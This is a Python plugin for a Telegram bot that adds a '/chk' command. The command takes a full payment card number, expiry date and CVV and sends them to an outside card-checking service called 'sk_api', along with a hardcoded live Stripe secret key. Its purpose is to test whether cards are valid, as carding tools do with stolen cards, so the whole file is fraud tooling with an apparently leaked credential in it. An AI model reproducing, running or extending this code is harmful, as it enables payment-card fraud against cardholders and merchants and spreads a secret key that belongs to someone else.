from EQUROBOT import app
import requests
import re
from pyrogram import filters
from pyrogram.types import Message
from pyrogram.enums import ParseMode

@app.on_message(filters.command("chk", prefixes=[".", "/"]))
async def check_cc(_, message: Message):
    cc = message.text.split(maxsplit=1)[1].strip()
    reply_msg = message.reply_to_message

    if reply_msg:
        cc = reply_msg.text.strip()

    x = re.findall(r'\d+', cc)
    if len(x) != 4:
        return await message.reply_text('Invalid CC format. Should be in the format: 4355460260824973|03|2029|273')

    ccn = x[0]
    mm = x[1]
    yy = x[2]
    cvv = x[3]

    VALID = ('37', '34', '4', '51', '52', '53', '54', '55', '64', '65', '6011')
    if not ccn.startswith(VALID):
        return await message.reply_text('Invalid CC Type')

    reply = await message.reply_text('`Processing...`')

    url = "https://mvy.ai/sk_api/api.php"
    params = {
        "lista": f"{ccn}:{mm}:{yy}:{cvv}",
        "sk": "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"
    }

    try:
        r = requests.get(url, params=params)
        r.raise_for_status()
        response = r.json()
        await message.reply_text(response['html_message'], parse_mode=ParseMode.HTML)

    except requests.exceptions.RequestException as e:
        await message.reply_text(f"Error processing request: {e}")

    except KeyError:
        await message.reply_text("Error: Unexpected response from the API")

    finally:
        await reply.delete()

